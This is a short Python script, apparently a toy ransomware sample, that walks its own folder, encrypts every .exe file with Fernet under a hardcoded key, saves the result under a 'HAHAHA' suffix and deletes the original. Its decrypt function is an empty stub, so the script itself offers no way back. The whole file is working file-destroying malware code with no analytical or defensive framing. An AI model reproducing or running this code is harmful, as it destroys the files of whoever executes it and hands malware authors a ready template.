import os
import base64
import sys
from cryptography.fernet import Fernet

THIS_DIR = os.path.dirname(os.path.realpath(__file__))
KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='

def encrypt(data, filename):
	f = Fernet(KEY)

	encrypted_data = f.encrypt(data)

	return encrypted_data

def decrypt(data):
	pass

if __name__ == "__main__":
	for (dirpath, dirnames, filenames) in os.walk(THIS_DIR):
		break
		
	for file in filenames:
		if file.endswith(".exe"):
			with open(file, "rb") as f:
				data = f.read()

			destination = file + "HAHAHA"
			with open(destination, "wb") as fd:
				fd.write(encrypt(data, file))
			os.remove(file)